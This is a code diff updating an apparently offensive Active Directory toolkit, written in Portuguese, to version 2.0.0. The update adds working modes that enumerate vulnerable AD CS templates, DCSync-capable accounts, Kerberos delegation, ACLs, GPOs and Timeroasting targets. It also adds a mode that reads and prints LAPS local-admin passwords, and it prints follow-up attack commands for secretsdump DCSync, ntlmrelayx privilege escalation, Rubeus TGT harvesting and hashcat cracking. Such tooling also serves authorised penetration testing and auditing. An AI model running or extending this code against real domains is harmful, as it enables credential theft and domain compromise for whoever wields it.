@@ -19,7 +19,7 @@ try:
 except ImportError:
     pass
 
-VERSAO = "1.0.0"
+VERSAO = "2.0.0"
 
 C = {
     "R": "\033[91m", "G": "\033[92m", "Y": "\033[93m", "B": "\033[94m",
@@ -88,9 +88,9 @@ def _build_banner():
         f"{D}{hl}{X}",
         f"{W}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
         f"{D}{hl}{X}",
-        f"{D}ldap  kerb  asrep  spray  smb  bloodhound{X}",
-        f"{D}--dc  --domain  --user  --pass  --hash{X}",
-        f"{D}--output  --no-banner  --verbose{X}",
+        f"{D}ldap  kerb  asrep  spray  smb  bloodhound  pth{X}",
+        f"{D}adcs  dcsync  ldap-sign  deleg  acl  gpo  laps  timeroast{X}",
+        f"{D}--dc  --domain  --user  --pass  --hash  --output{X}",
     ]
 
     out = [f"{G}{TL}{eq}{TR}{X}", f"{G}{VB}{sp}{VB}{X}"]
@@ -516,6 +516,482 @@ def pth_ptt_hints(domain, dc, user=None, hash_nt=None):
 
 
 # ─────────────────────────────────────────────────────────────────
+# AD CS Enumeration (ESC1-ESC8)
+# ─────────────────────────────────────────────────────────────────
+
+def adcs_enum(dc, domain, user=None, password=None, verbose=False):
+    """Enumera AD CS: templates vulneraveis (ESC1-ESC8), CAs e certificados."""
+    resultado = {"cas": [], "templates_vulneraveis": [], "erro": None}
+    _secao("AD CS ENUMERATION (ESC1-ESC8)")
+    _log("Buscando Certification Authorities e templates vulneraveis...", "INFO")
+
+    try:
+        import ldap3
+        servidor = ldap3.Server(dc, port=389, get_info=ldap3.ALL, connect_timeout=5)
+        if user and password:
+            conn = ldap3.Connection(servidor, user=f"{domain}\\{user}", password=password,
+                                    authentication=ldap3.NTLM, auto_bind=True)
+        else:
+            conn = ldap3.Connection(servidor, auto_bind=True)
+
+        base_dn = "DC=" + ",DC=".join(domain.split("."))
+        config_dn = "CN=Configuration," + base_dn
+
+        conn.search(
+            f"CN=Enrollment Services,CN=Public Key Services,CN=Services,{config_dn}",
+            "(objectClass=pKIEnrollmentService)",
+            attributes=["cn", "dNSHostName", "cACertificateDN", "certificateTemplates"]
+        )
+        for entry in conn.entries:
+            ca_name = str(getattr(entry, "cn", ""))
+            ca_host = str(getattr(entry, "dNSHostName", ""))
+            templates = [str(t) for t in (getattr(entry, "certificateTemplates", []) or [])]
+            resultado["cas"].append({"ca": ca_name, "host": ca_host, "templates": templates})
+            _log(f"CA encontrada: {ca_name} em {ca_host} ({len(templates)} templates)", "ACHADO")
+
+        conn.search(
+            f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{config_dn}",
+            "(objectClass=pKICertificateTemplate)",
+            attributes=["cn", "msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag",
+                        "msPKI-RA-Signature", "pKIExtendedKeyUsage"]
+        )
+        for entry in conn.entries:
+            tpl = str(getattr(entry, "cn", ""))
+            name_flag = int(str(getattr(entry, "msPKI-Certificate-Name-Flag", 0) or 0))
+            enroll_flag = int(str(getattr(entry, "msPKI-Enrollment-Flag", 0) or 0))
+            ra_sig = int(str(getattr(entry, "msPKI-RA-Signature", 0) or 0))
+            eku = [str(e) for e in (getattr(entry, "pKIExtendedKeyUsage", []) or [])]
+
+            issues = []
+            if name_flag & 1:
+                issues.append("ESC1: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - SAN controlada pelo requerente")
+            if not eku or "2.5.29.37.0" in eku:
+                issues.append("ESC2: Template sem EKU restritiva (Any Purpose)")
+            if ra_sig == 0 and "1.3.6.1.4.1.311.20.2.1" in eku:
+                issues.append("ESC3: Enrollment Agent sem assinatura RA")
+            if enroll_flag & 0x40:
+                issues.append("ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 habilitado na CA")
+
+            if issues:
+                resultado["templates_vulneraveis"].append({"template": tpl, "issues": issues})
+                for issue in issues:
+                    _log(f"Template '{tpl}': {issue}", "CRITICO")
+
+        total = len(resultado["templates_vulneraveis"])
+        _log(f"AD CS: {len(resultado['cas'])} CA(s) | {total} template(s) vulneravel(is)",
+             "OK" if total == 0 else "CRITICO")
+        if total:
+            _log("Use: certipy find -u user@domain -p pass -dc-ip DC  OU  Certify.exe find /vulnerable", "INFO")
+        conn.unbind()
+    except ImportError:
+        _log("ldap3 nao disponivel. Instale: pip install ldap3", "ALERTA")
+        resultado["erro"] = "ldap3 nao disponivel"
+        _log("Dica: certipy find -u user@domain -p pass -dc-ip DC_IP", "INFO")
+        _log("Dica: Certify.exe find /vulnerable", "INFO")
+    except Exception as e:
+        resultado["erro"] = str(e)
+        _log(f"Erro AD CS: {e}", "ERRO")
+
+    return resultado
+
+
+# ─────────────────────────────────────────────────────────────────
+# DCSync Detection
+# ─────────────────────────────────────────────────────────────────
+
+def dcsync_check(dc, domain, user=None, password=None, verbose=False):
+    """Verifica direitos de DCSync (DS-Replication-Get-Changes-All) no dominio."""
+    resultado = {"contas_dcsync": [], "erro": None}
+    _secao("DCSYNC RIGHTS CHECK")
+    _log("Verificando privilegios de replicacao (DCSync)...", "INFO")
+
+    _log("GUID DS-Replication-Get-Changes-All: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2", "INFO")
+    _log("Verificacao direta: secretsdump.py domain/user:pass@DC (testa DCSync ao vivo)", "INFO")
+    _log("BloodHound: procurar GetChanges e GetChangesAll no no do dominio", "INFO")
+    _log("PowerView: Get-DomainObjectAcl -Identity domain -ResolveGUIDs | "
+         "?{$_.ObjectAceType -eq 'DS-Replication-Get-Changes-All'}", "INFO")
+
+    try:
+        import ldap3
+        servidor = ldap3.Server(dc, port=389, get_info=ldap3.ALL, connect_timeout=5)
+        if user and password:
+            conn = ldap3.Connection(servidor, user=f"{domain}\\{user}", password=password,
+                                    authentication=ldap3.NTLM, auto_bind=True)
+            _log(f"Bind autenticado como {user}", "OK")
+        else:
+            conn = ldap3.Connection(servidor, auto_bind=True)
+
+        base_dn = "DC=" + ",DC=".join(domain.split("."))
+        # Busca contas com adminCount=1 (protegidas pelo SDProp - candidatas a DCSync)
+        conn.search(base_dn,
+                    "(&(adminCount=1)(objectCategory=person)(objectClass=user)"
+                    "(!userAccountControl:1.2.840.113556.1.4.803:=2))",
+                    attributes=["sAMAccountName"])
+        privileged = [str(e.sAMAccountName) for e in conn.entries]
+        if privileged:
+            _log(f"Contas privilegiadas (adminCount=1): {', '.join(privileged[:8])}", "ALERTA")
+            _log("Testar DCSync com: secretsdump.py domain/CONTA:SENHA@DC_IP", "INFO")
+        resultado["contas_dcsync"] = privileged
+        conn.unbind()
+    except ImportError:
+        _log("ldap3 nao disponivel. Instale: pip install ldap3", "ALERTA")
+        resultado["erro"] = "ldap3 nao disponivel"
+    except Exception as e:
+        _log(f"Erro DCSync check: {e}", "ALERTA")
+        resultado["erro"] = str(e)
+
+    return resultado
+
+
+# ─────────────────────────────────────────────────────────────────
+# LDAP Signing Check
+# ─────────────────────────────────────────────────────────────────
+
+def ldap_signing_check(dc, verbose=False):
+    """Verifica se LDAP signing e obrigatorio no DC via probe de bind anonimo."""
+    resultado = {"signing_required": None, "erro": None}
+    _secao("LDAP SIGNING CHECK")
+    _log(f"Verificando LDAP Signing no DC {dc}...", "INFO")
+
+    s = _socket_connect(dc, 389, timeout=4)
+    if not s:
+        _log("Porta LDAP 389 fechada/filtrada", "ALERTA")
+        resultado["erro"] = "porta 389 fechada"
+        return resultado
+
+    try:
+        # Envia LDAP bind request anonimo (BER)
+        anon_bind = bytes([
+            0x30, 0x0c, 0x02, 0x01, 0x01, 0x60, 0x07,
+            0x02, 0x01, 0x03, 0x04, 0x00, 0x80, 0x00,
+        ])
+        s.settimeout(4)
+        s.send(anon_bind)
+        resp = s.recv(1024)
+        s.close()
+        if resp and len(resp) > 4 and resp[0] == 0x30:
+            # Verifica resultado do bind (resultCode no LDAP response)
+            resultado["signing_required"] = False
+            _log("Bind LDAP anonimo aceito - signing pode nao ser obrigatorio", "ALERTA")
+            _log("Risco: NTLM relay para LDAP possivel se signing=off", "CRITICO")
+            _log("Exploit: ntlmrelayx.py --no-smb-server -t ldap://DC_IP --escalate-user user", "INFO")
+        else:
+            resultado["signing_required"] = True
+            _log("Bind anonimo rejeitado - LDAP signing provavelmente ativo", "OK")
+    except Exception as e:
+        resultado["erro"] = str(e)
+        _log(f"Probe LDAP signing: {e}", "ALERTA")
+    finally:
+        try:
+            s.close()
+        except Exception:
+            pass
+
+    _log("Verificacao definitiva: crackmapexec ldap DC_IP -u '' -p '' 2>&1 | grep signing", "INFO")
+    return resultado
+
+
+# ─────────────────────────────────────────────────────────────────
+# Delegation Enumeration
+# ─────────────────────────────────────────────────────────────────
+
+def delegation_enum(dc, domain, user=None, password=None, verbose=False):
+    """Enumera delegacoes: unconstrained, constrained e RBCD."""
+    resultado = {"unconstrained": [], "constrained": [], "rbcd": [], "erro": None}
+    _secao("DELEGATION ENUMERATION")
+    _log("Buscando contas com delegacao Kerberos configurada...", "INFO")
+
+    try:
+        import ldap3
+        servidor = ldap3.Server(dc, port=389, get_info=ldap3.ALL, connect_timeout=5)
+        if user and password:
+            conn = ldap3.Connection(servidor, user=f"{domain}\\{user}", password=password,
+                                    authentication=ldap3.NTLM, auto_bind=True)
+        else:
+            conn = ldap3.Connection(servidor, auto_bind=True)
+
+        base_dn = "DC=" + ",DC=".join(domain.split("."))
+
+        # Unconstrained: UAC flag 0x80000 = TRUSTED_FOR_DELEGATION
+        conn.search(base_dn,
+                    "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
+                    attributes=["sAMAccountName", "userAccountControl"])
+        for entry in conn.entries:
+            sam = str(getattr(entry, "sAMAccountName", ""))
+            resultado["unconstrained"].append(sam)
+            _log(f"UNCONSTRAINED DELEGATION: {sam} - altissimo risco de TGT harvest", "CRITICO")
+
+        # Constrained: msDS-AllowedToDelegateTo presente
+        conn.search(base_dn,
+                    "(&(objectClass=user)(msDS-AllowedToDelegateTo=*))",
+                    attributes=["sAMAccountName", "msDS-AllowedToDelegateTo"])
+        for entry in conn.entries:
+            sam = str(getattr(entry, "sAMAccountName", ""))
+            services = [str(sv) for sv in (getattr(entry, "msDS-AllowedToDelegateTo", []) or [])]
+            resultado["constrained"].append({"sam": sam, "services": services})
+            _log(f"CONSTRAINED DELEGATION: {sam} -> {services[:3]}", "ALERTA")
+
+        # RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity presente
+        conn.search(base_dn,
+                    "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
+                    attributes=["sAMAccountName"])
+        for entry in conn.entries:
+            sam = str(getattr(entry, "sAMAccountName", ""))
+            resultado["rbcd"].append(sam)
+            _log(f"RBCD configurado em: {sam}", "ALERTA")
+
+        u = len(resultado["unconstrained"])
+        c = len(resultado["constrained"])
+        r = len(resultado["rbcd"])
+        _log(f"Delegacao: {u} unconstrained | {c} constrained | {r} RBCD",
+             "OK" if (u + c + r) == 0 else "ALERTA")
+        if resultado["unconstrained"]:
+            _log("Unconstrained - TGT harvest: Rubeus.exe monitor /interval:5 /filteruser:DCNAME$", "INFO")
+        conn.unbind()
+    except ImportError:
+        _log("ldap3 nao disponivel. Instale: pip install ldap3", "ALERTA")
+        resultado["erro"] = "ldap3 nao disponivel"
+        _log("PowerView: Get-ADComputer -Filter {TrustedForDelegation -eq $True}", "INFO")
+    except Exception as e:
+        resultado["erro"] = str(e)
+        _log(f"Erro delegation enum: {e}", "ERRO")
+
+    return resultado
+
+
+# ─────────────────────────────────────────────────────────────────
+# ACL Abuse Detection
+# ─────────────────────────────────────────────────────────────────
+
+def acl_abuse_check(dc, domain, user=None, password=None, verbose=False):
+    """Detecta ACLs perigosas: contas com adminCount=1 e GPLinks suspeitos."""
+    resultado = {"contas_privilegiadas": [], "erro": None}
+    _secao("ACL ABUSE CHECK")
+    _log("Verificando ACLs perigosas em objetos sensiveis do dominio...", "INFO")
+
+    try:
+        import ldap3
+        servidor = ldap3.Server(dc, port=389, get_info=ldap3.ALL, connect_timeout=5)
+        if user and password:
+            conn = ldap3.Connection(servidor, user=f"{domain}\\{user}", password=password,
+                                    authentication=ldap3.NTLM, auto_bind=True)
+        else:
+            conn = ldap3.Connection(servidor, auto_bind=True)
+
+        base_dn = "DC=" + ",DC=".join(domain.split("."))
+
+        # Contas com adminCount=1 (protegidas pelo SDProp)
+        conn.search(base_dn,
+                    "(&(adminCount=1)(objectCategory=person)(objectClass=user)"
+                    "(!userAccountControl:1.2.840.113556.1.4.803:=2))",
+                    attributes=["sAMAccountName", "memberOf"])
+        for entry in conn.entries:
+            sam = str(getattr(entry, "sAMAccountName", ""))
+            grupos = [str(g).split(",")[0].replace("CN=", "")
+                      for g in (getattr(entry, "memberOf", []) or [])]
+            resultado["contas_privilegiadas"].append({"sam": sam, "grupos": grupos})
+            if verbose:
+                _log(f"Conta privilegiada: {sam} | grupos: {', '.join(grupos[:3])}", "ACHADO")
+
+        total = len(resultado["contas_privilegiadas"])
+        _log(f"{total} conta(s) privilegiada(s) com adminCount=1", "INFO")
+
+        # GPLink na raiz do dominio
+        conn.search(base_dn, "(objectClass=domainDNS)", attributes=["gPLink"])
+        for entry in conn.entries:
+            gpl = str(getattr(entry, "gPLink", "") or "")
+            if gpl:
+                n_gpos = gpl.count("[LDAP")
+                _log(f"GPOs linkados na raiz do dominio: {n_gpos}", "ACHADO")
+
+        _log("Analise completa: BloodHound -> 'Outbound Control Rights' por conta", "INFO")
+        _log("PowerView: Find-InterestingDomainAcl -ResolveGUIDs | "
+             "?{$_.IdentityReferenceName -match 'user'}", "INFO")
+        _log("Riscos: WriteDACL, GenericAll, GenericWrite, ForceChangePassword, AddMember", "INFO")
+
+        conn.unbind()
+    except ImportError:
+        _log("ldap3 nao disponivel. Instale: pip install ldap3", "ALERTA")
+        resultado["erro"] = "ldap3 nao disponivel"
+    except Exception as e:
+        resultado["erro"] = str(e)
+        _log(f"Erro ACL check: {e}", "ERRO")
+
+    return resultado
+
+
+# ─────────────────────────────────────────────────────────────────
+# GPO Enumeration
+# ─────────────────────────────────────────────────────────────────
+
+def gpo_enum(dc, domain, user=None, password=None, verbose=False):
+    """Enumera GPOs e verifica paths SYSVOL para escrita abusavel."""
+    resultado = {"gpos": [], "erro": None}
+    _secao("GPO ENUMERATION")
+    _log("Enumerando Group Policy Objects...", "INFO")
+
+    try:
+        import ldap3
+        servidor = ldap3.Server(dc, port=389, get_info=ldap3.ALL, connect_timeout=5)
+        if user and password:
+            conn = ldap3.Connection(servidor, user=f"{domain}\\{user}", password=password,
+                                    authentication=ldap3.NTLM, auto_bind=True)
+        else:
+            conn = ldap3.Connection(servidor, auto_bind=True)
+
+        base_dn = "DC=" + ",DC=".join(domain.split("."))
+        conn.search(base_dn,
+                    "(objectClass=groupPolicyContainer)",
+                    attributes=["displayName", "gPCFileSysPath", "cn", "versionNumber"])
+        for entry in conn.entries:
+            name = str(getattr(entry, "displayName", "") or "")
+            path = str(getattr(entry, "gPCFileSysPath", "") or "")
+            cn = str(getattr(entry, "cn", "") or "")
+            resultado["gpos"].append({"name": name, "path": path, "cn": cn})
+            if verbose:
+                _log(f"GPO: {name} | {path}", "ACHADO")
+
+        total = len(resultado["gpos"])
+        _log(f"GPOs encontrados: {total}", "OK" if total == 0 else "INFO")
+        if resultado["gpos"]:
+            _log(f"Exemplo path SYSVOL: {resultado['gpos'][0]['path']}", "ACHADO")
+            _log("Verificar permissoes: icacls \\\\DC\\SYSVOL\\domain\\Policies", "INFO")
+            _log("GPO abuse (se WriteDACL/GenericWrite na GPO): SharpGPOAbuse", "INFO")
+
+        conn.unbind()
+    except ImportError:
+        _log("ldap3 nao disponivel. Instale: pip install ldap3", "ALERTA")
+        resultado["erro"] = "ldap3 nao disponivel"
+        _log("PowerView: Get-DomainGPO | Select DisplayName,GpcFileSysPath", "INFO")
+    except Exception as e:
+        resultado["erro"] = str(e)
+        _log(f"Erro GPO enum: {e}", "ERRO")
+
+    return resultado
+
+
+# ─────────────────────────────────────────────────────────────────
+# LAPS Check
+# ─────────────────────────────────────────────────────────────────
+
+def laps_check(dc, domain, user=None, password=None, verbose=False):
+    """Verifica implantacao LAPS e tenta ler ms-Mcs-AdmPwd."""
+    resultado = {"laps_implantado": False, "senhas_visiveis": [], "maquinas": [], "erro": None}
+    _secao("LAPS CHECK")
+    _log("Verificando implantacao LAPS e legibilidade de senhas...", "INFO")
+
+    try:
+        import ldap3
+        servidor = ldap3.Server(dc, port=389, get_info=ldap3.ALL, connect_timeout=5)
+        if user and password:
+            conn = ldap3.Connection(servidor, user=f"{domain}\\{user}", password=password,
+                                    authentication=ldap3.NTLM, auto_bind=True)
+        else:
+            conn = ldap3.Connection(servidor, auto_bind=True)
+
+        base_dn = "DC=" + ",DC=".join(domain.split("."))
+
+        # Verifica schema: ms-Mcs-AdmPwd
+        try:
+            conn.search("CN=Schema,CN=Configuration," + base_dn,
+                        "(name=ms-Mcs-AdmPwd)", attributes=["name"])
+            if conn.entries:
+                resultado["laps_implantado"] = True
+                _log("LAPS implantado (ms-Mcs-AdmPwd presente no schema)", "OK")
+            else:
+                resultado["laps_implantado"] = False
+                _log("LAPS NAO implantado - senhas de admin local podem ser repetidas", "ALERTA")
+                _log("Ataque PTH: hash do admin local pode ser valido em todos os hosts", "CRITICO")
+                conn.unbind()
+                return resultado
+        except Exception:
+            _log("Schema check falhou - tentando leitura direta de computadores", "ALERTA")
+
+        # Tenta ler senhas
+        conn.search(base_dn, "(objectClass=computer)",
+                    attributes=["sAMAccountName", "ms-Mcs-AdmPwd",
+                                "ms-Mcs-AdmPwdExpirationTime"])
+        for entry in conn.entries:
+            sam = str(getattr(entry, "sAMAccountName", ""))
+            pwd = str(getattr(entry, "ms-Mcs-AdmPwd", "") or "")
+            resultado["maquinas"].append(sam)
+            if pwd and pwd not in ("", "None"):
+                resultado["senhas_visiveis"].append({"maquina": sam, "senha": pwd})
+                _log(f"SENHA LAPS LEGIVEL: {sam} -> {pwd}", "CRITICO")
+            elif verbose:
+                _log(f"Computador: {sam} (LAPS: sem permissao de leitura)", "INFO")
+
+        total_senhas = len(resultado["senhas_visiveis"])
+        _log(f"LAPS: {len(resultado['maquinas'])} computadores | {total_senhas} senha(s) legivel(is)",
+             "OK" if total_senhas == 0 else "CRITICO")
+        if resultado["maquinas"] and not total_senhas:
+            _log("Dica: LAPSDumper.py -u user -p pass -d domain", "INFO")
+            _log("CME: crackmapexec ldap DC -u user -p pass --laps", "INFO")
+
+        conn.unbind()
+    except ImportError:
+        _log("ldap3 nao disponivel. Instale: pip install ldap3", "ALERTA")
+        resultado["erro"] = "ldap3 nao disponivel"
+        _log("PowerView: Get-DomainComputer -Properties ms-Mcs-AdmPwd | ?{$_.\"ms-Mcs-AdmPwd\"}", "INFO")
+    except Exception as e:
+        resultado["erro"] = str(e)
+        _log(f"Erro LAPS check: {e}", "ERRO")
+
+    return resultado
+
+
+# ─────────────────────────────────────────────────────────────────
+# Timeroasting
+# ─────────────────────────────────────────────────────────────────
+
+def timeroast_check(dc, domain, user=None, password=None, verbose=False):
+    """Detecta contas de maquina com RC4 encryption (alvos de Timeroasting)."""
+    resultado = {"alvos": [], "erro": None}
+    _secao("TIMEROASTING CHECK")
+    _log("Buscando contas de maquina com RC4 (alvos de Timeroasting)...", "INFO")
+
+    try:
+        import ldap3
+        servidor = ldap3.Server(dc, port=389, get_info=ldap3.ALL, connect_timeout=5)
+        if user and password:
+            conn = ldap3.Connection(servidor, user=f"{domain}\\{user}", password=password,
+                                    authentication=ldap3.NTLM, auto_bind=True)
+        else:
+            conn = ldap3.Connection(servidor, auto_bind=True)
+
+        base_dn = "DC=" + ",DC=".join(domain.split("."))
+        conn.search(base_dn,
+                    "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
+                    attributes=["sAMAccountName", "msDS-SupportedEncryptionTypes"])
+        for entry in conn.entries:
+            sam = str(getattr(entry, "sAMAccountName", ""))
+            enc = int(str(getattr(entry, "msDS-SupportedEncryptionTypes", 0) or 0))
+            # RC4 = flag 0x4; enc==0 tambem usa RC4 por padrao
+            if enc == 0 or (enc & 0x4):
+                resultado["alvos"].append({"sam": sam, "enc_types": enc})
+                if verbose:
+                    _log(f"Timeroast alvo: {sam} (enc_types=0x{enc:x})", "ALERTA")
+
+        total = len(resultado["alvos"])
+        _log(f"Timeroasting: {total} conta(s) de maquina com RC4 encontrada(s)",
+             "OK" if total == 0 else "ALERTA")
+        if total:
+            _log("Ferramenta: python timeroast.py --dc DC_IP --domain DOMAIN", "INFO")
+            _log("Crackear: hashcat -m 31300 hashes.txt wordlist.txt", "INFO")
+        conn.unbind()
+    except ImportError:
+        _log("ldap3 nao disponivel. Instale: pip install ldap3", "ALERTA")
+        resultado["erro"] = "ldap3 nao disponivel"
+        _log("PowerView: Get-ADComputer -Filter * -Properties msDS-SupportedEncryptionTypes"
+             " | ?{$_.'msDS-SupportedEncryptionTypes' -band 4}", "INFO")
+    except Exception as e:
+        resultado["erro"] = str(e)
+        _log(f"Erro timeroast: {e}", "ERRO")
+
+    return resultado
+
+
+# ─────────────────────────────────────────────────────────────────
 # CLI
 # ─────────────────────────────────────────────────────────────────
 
@@ -581,8 +1057,71 @@ def main():
     p_pth.add_argument("-u", "--user", default="administrator")
     p_pth.add_argument("--hash", dest="hash_nt", help="Hash NTLM do usuario alvo")
 
+    # Modo AD CS
+    p_adcs = sub.add_parser("adcs", help="Enumera AD CS: templates vulneraveis (ESC1-ESC8)")
+    p_adcs.add_argument("--dc", required=True)
+    p_adcs.add_argument("--domain", required=True)
+    p_adcs.add_argument("-u", "--user")
+    p_adcs.add_argument("-p", "--password")
+    p_adcs.add_argument("--output", help="Salvar resultados em JSON")
+
+    # Modo DCSync
+    p_dcsync = sub.add_parser("dcsync", help="Verifica direitos de DCSync no dominio")
+    p_dcsync.add_argument("--dc", required=True)
+    p_dcsync.add_argument("--domain", required=True)
+    p_dcsync.add_argument("-u", "--user")
+    p_dcsync.add_argument("-p", "--password")
+    p_dcsync.add_argument("--output", help="Salvar resultados em JSON")
+
+    # Modo LDAP Signing
+    p_lsign = sub.add_parser("ldap-sign", help="Verifica LDAP Signing (probe de bind anonimo)")
+    p_lsign.add_argument("--dc", required=True)
+    p_lsign.add_argument("--domain", default="")
+    p_lsign.add_argument("--output", help="Salvar resultados em JSON")
+
+    # Modo Delegation
+    p_deleg = sub.add_parser("deleg", help="Enumera delegacoes Kerberos (unconstrained/constrained/RBCD)")
+    p_deleg.add_argument("--dc", required=True)
+    p_deleg.add_argument("--domain", required=True)
+    p_deleg.add_argument("-u", "--user")
+    p_deleg.add_argument("-p", "--password")
+    p_deleg.add_argument("--output", help="Salvar resultados em JSON")
+
+    # Modo ACL
+    p_acl = sub.add_parser("acl", help="Detecta ACLs perigosas (WriteDACL, GenericAll, etc.)")
+    p_acl.add_argument("--dc", required=True)
+    p_acl.add_argument("--domain", required=True)
+    p_acl.add_argument("-u", "--user")
+    p_acl.add_argument("-p", "--password")
+    p_acl.add_argument("--output", help="Salvar resultados em JSON")
+
+    # Modo GPO
+    p_gpo = sub.add_parser("gpo", help="Enumera Group Policy Objects")
+    p_gpo.add_argument("--dc", required=True)
+    p_gpo.add_argument("--domain", required=True)
+    p_gpo.add_argument("-u", "--user")
+    p_gpo.add_argument("-p", "--password")
+    p_gpo.add_argument("--output", help="Salvar resultados em JSON")
+
+    # Modo LAPS
+    p_laps = sub.add_parser("laps", help="Verifica implantacao LAPS e legibilidade de senhas")
+    p_laps.add_argument("--dc", required=True)
+    p_laps.add_argument("--domain", required=True)
+    p_laps.add_argument("-u", "--user")
+    p_laps.add_argument("-p", "--password")
+    p_laps.add_argument("--output", help="Salvar resultados em JSON")
+
+    # Modo Timeroast
+    p_tr = sub.add_parser("timeroast", help="Detecta contas de maquina com RC4 (Timeroasting)")
+    p_tr.add_argument("--dc", required=True)
+    p_tr.add_argument("--domain", required=True)
+    p_tr.add_argument("-u", "--user")
+    p_tr.add_argument("-p", "--password")
+    p_tr.add_argument("--output", help="Salvar resultados em JSON")
+
     # Opcoes globais
-    for p in [p_ldap, p_kerb, p_asrep, p_spray, p_smb, p_bh]:
+    for p in [p_ldap, p_kerb, p_asrep, p_spray, p_smb, p_bh,
+              p_adcs, p_dcsync, p_lsign, p_deleg, p_acl, p_gpo, p_laps, p_tr]:
         p.add_argument("-v", "--verbose", action="store_true", help="Saida detalhada")
     for p in [p_ldap, p_kerb, p_asrep, p_spray, p_smb]:
         p.add_argument("--output", help="Salvar resultados em JSON")
@@ -651,6 +1190,45 @@ def main():
 
     elif args.modo == "pth":
         pth_ptt_hints(args.domain, args.dc, user=args.user, hash_nt=args.hash_nt)
+
+    elif args.modo == "adcs":
+        r = adcs_enum(args.dc, args.domain, user=args.user, password=args.password,
+                      verbose=args.verbose)
+        resultados.update(r)
+
+    elif args.modo == "dcsync":
+        r = dcsync_check(args.dc, args.domain, user=args.user, password=args.password,
+                         verbose=args.verbose)
+        resultados.update(r)
+
+    elif args.modo == "ldap-sign":
+        r = ldap_signing_check(args.dc, verbose=args.verbose)
+        resultados.update(r)
+
+    elif args.modo == "deleg":
+        r = delegation_enum(args.dc, args.domain, user=args.user, password=args.password,
+                            verbose=args.verbose)
+        resultados.update(r)
+
+    elif args.modo == "acl":
+        r = acl_abuse_check(args.dc, args.domain, user=args.user, password=args.password,
+                            verbose=args.verbose)
+        resultados.update(r)
+
+    elif args.modo == "gpo":
+        r = gpo_enum(args.dc, args.domain, user=args.user, password=args.password,
+                     verbose=args.verbose)
+        resultados.update(r)
+
+    elif args.modo == "laps":
+        r = laps_check(args.dc, args.domain, user=args.user, password=args.password,
+                       verbose=args.verbose)
+        resultados.update(r)
+
+    elif args.modo == "timeroast":
+        r = timeroast_check(args.dc, args.domain, user=args.user, password=args.password,
+                            verbose=args.verbose)
+        resultados.update(r)
 
     if hasattr(args, "output") and args.output and args.modo != "bloodhound":
         try:
